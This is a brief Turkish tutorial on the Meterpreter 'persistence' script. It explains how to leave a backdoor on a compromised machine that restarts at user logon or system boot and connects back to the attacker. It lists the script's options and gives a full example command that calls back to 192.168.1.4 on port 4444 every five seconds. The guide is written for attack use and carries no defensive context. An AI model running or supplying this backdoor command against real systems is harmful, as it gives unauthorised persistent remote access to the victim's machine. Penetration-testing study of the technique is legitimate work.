# persistence
Meterpreter Persistence Kullanımı

Meterpreter oturumuzun olduğunuz servis bir sonraki denemenizde kapalıysa ne güzel oturumum vardı. Şimdi yok demek yerine
meterpreter oturumumuzda  persistence.rb betiği çalıştırarak kendinize bir arkakapı bırakabilirsiniz. Meterpreter oturumumuzda
run persistence diyerek gerekli parametler verilerek oluşturulur.
Parametreler
-U : Kullanıcı oturumu açtığında otamatik olarak başlatma
-S : Sistem açılılırken otomatik olarak başlatma
-i : Zaman aralığı belirtmek için kullanılır.
-p : Dinleyeceğimiz , bağlanacağımız port belirtmek için kullanılır.
-r : Bağlanacağımız ip adresi. Aslında kendi ip adresimiz. Hedef bilgisayarda çalıştırdığımız için remote olarak kullanıyoruz.

Örnek kullanım:
run persistence -U -i 5 -p 4444 -r 192.168.1.4
Kullanıcı oturum açtığında 5 saniye aralıklarla 192.168.1.4 adresinde bulunan makinenin 4444 portuna istek yap anlamındadır.

